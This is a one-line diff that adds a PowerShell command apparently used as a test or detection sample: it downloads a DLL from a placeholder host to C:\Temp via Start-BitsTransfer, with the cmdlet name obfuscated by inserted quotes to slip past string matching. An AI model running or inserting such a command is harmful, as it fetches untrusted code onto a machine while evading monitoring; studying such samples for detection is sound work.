@@ -1,0 +1,1 @@
+powershell.exe -Command Start-B"i"tsTransfer -Source http://my.host/custom.dll -Destination C:\Temp\nice.dll
